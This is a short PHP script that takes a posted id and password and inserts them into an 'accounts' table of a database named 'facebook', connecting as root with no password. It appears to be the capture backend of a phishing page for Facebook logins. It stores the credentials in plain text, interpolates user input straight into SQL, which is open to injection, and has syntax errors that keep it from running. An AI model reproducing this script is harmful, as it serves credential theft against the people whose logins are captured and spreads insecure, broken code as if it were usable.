 <?php
$_POST["id"]
$servername = " phpMyAdmin demo";
$username = "root";
$password = "";
$dbname = "facebook";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$sql = "INSERT INTO accounts (id, pass,)
VALUES ('$_POST["id"]', '$_POST["pass"]')";

if ($conn->query($sql) === TRUE) {
    echo "New record created successfully";
} else {
    echo "Error: " . $sql . "<br>" . $conn->error;
}

$conn->close();
?> 
